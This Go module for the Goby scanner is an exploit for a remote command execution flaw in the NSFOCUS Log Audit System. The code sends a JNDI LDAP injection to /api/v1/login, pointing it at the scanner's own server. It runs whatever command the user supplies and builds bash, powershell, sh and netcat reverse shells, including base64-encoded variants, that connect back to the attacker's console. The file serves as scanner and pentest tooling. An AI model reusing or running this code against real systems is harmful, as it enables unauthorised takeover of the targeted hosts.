package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "NSFOCUS Log Audit System /login Command Execution Vulnerability",
    "Description": "<p>NSFOCUS Technology Group Co., Ltd. is a company that provides a full line of network security products, all-round security solutions and systematic security operation services for users in government, finance, carriers, energy, transportation, science, education, culture and health, and various types of enterprise users. </p><p>NSFOCUS Log Audit System has a command execution vulnerability, which can be exploited by an attacker to perform remote command execution.</p>",
    "Product": "Green-League-Log-Data-Sec-Analysis-System",
    "Homepage": "https://www.nsfocus.com.cn/html/2019/209_1008/57.html",
    "DisclosureDate": "2024-08-16",
    "PostTime": "2024-10-21",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"<title>{{platformName}}</title>\" && body=\"/pisces/favicon.ico\"",
    "GobyQuery": "body=\"<title>{{platformName}}</title>\" && body=\"/pisces/favicon.ico\"",
    "Level": "2",
    "Impact": "<p>NSFOCUS Log Audit System has a command execution vulnerability, which can be exploited by an attacker to perform remote command execution.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/Sec-Fork/POC-20240918/blob/main/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "绿盟日志审计系统 /login 命令执行漏洞",
            "Product": "绿盟日志数据安全性分析系统",
            "Description": "<p>绿盟科技集团股份有限公司是一家为政府、金融、运营商、能源、交通、科教文卫等行业用户与各类型企业用户，提供全线网络安全产品、全方位安全解决方案和体系化安全运营服务的公司。</p><p>绿盟科技集团股份有限公司绿盟日志审计系统存在命令执行漏洞，攻击者可利用该漏洞进行远程命令执行。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>绿盟科技集团股份有限公司绿盟日志审计系统存在命令执行漏洞，攻击者可利用该漏洞进行远程命令执行。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "NSFOCUS Log Audit System /login Command Execution Vulnerability",
            "Product": "Green-League-Log-Data-Sec-Analysis-System",
            "Description": "<p>NSFOCUS Technology Group Co., Ltd. is a company that provides a full line of network security products, all-round security solutions and systematic security operation services for users in government, finance, carriers, energy, transportation, science, education, culture and health, and various types of enterprise users.&nbsp;</p><p>NSFOCUS Log Audit System has a command execution vulnerability, which can be exploited by an attacker to perform remote command execution.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>NSFOCUS Log Audit System has a command execution vulnerability, which can be exploited by an attacker to perform remote command execution.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`
	setPayloadRequestHashsfjiahwfuieyuifjiowuefuiwfijwuiefhywjiwuqefh := func(hostInfo *httpclient.FixUrl, cmd string) (string, string, error) {
		loopholesRequestConfig := httpclient.NewPostRequestConfig("/api/v1/login")
		loopholesRequestConfig.FollowRedirect = false
		loopholesRequestConfig.VerifyTls = false
		loopholesRequestConfig.Header.Store("Content-Type", "application/json")
		loopholesRequestConfig.Header.Store("cmd", cmd)
		loopholesRequestConfig.Data = `{"name":"${jndi:ldap://` + godclient.GetGodServerIP() + `/A4}","password":"2Y4W5F5h"}`
		resp, err := httpclient.DoHttpRequest(hostInfo, loopholesRequestConfig)
		if err != nil {
			return "", "", err
		}
		url := "/api/v1/login"
		return resp.Utf8Html, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashsfjiahwfuieyuifjiowuefuiwfijwuiefhywjiwuqefh

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashsfjiahwfuieyuifjiowuefuiwfijwuiefhywjiwuqefh

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)
				Result = strings.Split(Result, "{\"m")[0]

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					// 定义正则表达式模式
					pattern := `((.|\n)*?){"errCode"`
					// 编译正则表达式
					re := regexp.MustCompile(pattern)
					if !re.MatchString(Result) {
						expResult.Success = false
						expResult.Output = "未找到匹配项"
						return expResult
					}
					// 在文本中查找匹配项
					match := re.FindStringSubmatch(Result)
					expResult.Success = true
					expResult.Output = match[1]
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
